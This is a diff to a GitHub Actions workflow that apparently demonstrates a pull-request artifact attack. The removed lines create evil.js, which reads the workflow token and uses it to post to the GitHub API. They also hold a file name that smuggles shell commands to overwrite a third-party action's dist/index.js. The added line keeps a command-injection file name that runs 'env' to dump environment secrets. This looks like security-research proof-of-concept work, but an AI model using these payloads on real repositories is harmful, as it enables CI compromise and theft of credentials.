@@ -14,16 +14,7 @@ jobs:
           mkdir -p /tmp/content
           printf 'hello from attacker pull request\n' > /tmp/content/summary.txt
           printf '%s\n' '${{ github.event.number }}' > /tmp/content/pr_number.txt
-          cat > /tmp/content/evil.js <<'JS'
-          const t = process.env.INPUT_TOKEN || '';
-          console.log('CAPTURED_TOKEN_LEN=' + t.length);
-          const https = require('https');
-          const body = JSON.stringify({body: 'TOKEN_CAPTURE_API_OK len=' + t.length});
-          const req = https.request({hostname:'api.github.com', path:'/repos/PDFtoMark/gab-poc-aave-helpers-wfr/issues/1/comments', method:'POST', headers:{'Authorization':'token '+t,'User-Agent':'poc','Accept':'application/vnd.github+json','Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}}, res => { console.log('API_STATUS=' + res.statusCode); let d=''; res.on('data',c=>d+=c); res.on('end',()=>console.log('API_BODY='+d.slice(0,60))); });
-          req.on('error', e => console.log('API_ERR=' + e.message));
-          req.write(body); req.end();
-          JS
-          printf 'x\n' > "/tmp/content/summary.txt;cd\${IFS}\$'\57'tmp\$'\57'content\$'\57'content-poc;cp\${IFS}evil.js\${IFS}\$RUNNER_WORKSPACE\$'\57'..\$'\57'_actions\$'\57'peter-evans\$'\57'find-comment\$'\57'v3\$'\57'dist\$'\57'index.js;#.txt"
+          printf 'x\n' > '/tmp/content/summary.txt;env;#.txt'
           ls -la /tmp/content
       - name: Upload artifact
         uses: actions/upload-artifact@v4
